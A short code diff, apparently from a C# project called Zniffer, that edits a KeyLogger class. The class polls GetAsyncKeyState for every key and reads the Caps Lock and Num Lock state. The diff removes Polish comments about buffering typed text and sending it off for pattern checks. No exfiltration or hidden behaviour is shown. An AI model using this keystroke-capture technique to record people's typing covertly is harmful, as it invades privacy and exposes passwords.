@@ -9,6 +9,7 @@ using System.Threading;
 
 namespace Zniffer {
     class KeyLogger {
+
         //event raised when key is pressed
         public delegate void keyCaptured(string s);
         public event keyCaptured RaiseKeyCapturedEvent;
@@ -53,10 +54,6 @@ namespace Zniffer {
 
             foreach (int i in Enum.GetValues(typeof(Keys))) {
                 if (GetAsyncKeyState(i) == -32767) {
-
-                    //enter czysci string
-                    //limit znakow w stringu
-                    //przekroczenie limitu = to co wypada wysłać do sprawdzenia? poroblem - nałożone części mogą dwa razy zwrócić wskazanie jeśli wzorzec był na przecięciu
 
                     bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                     bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
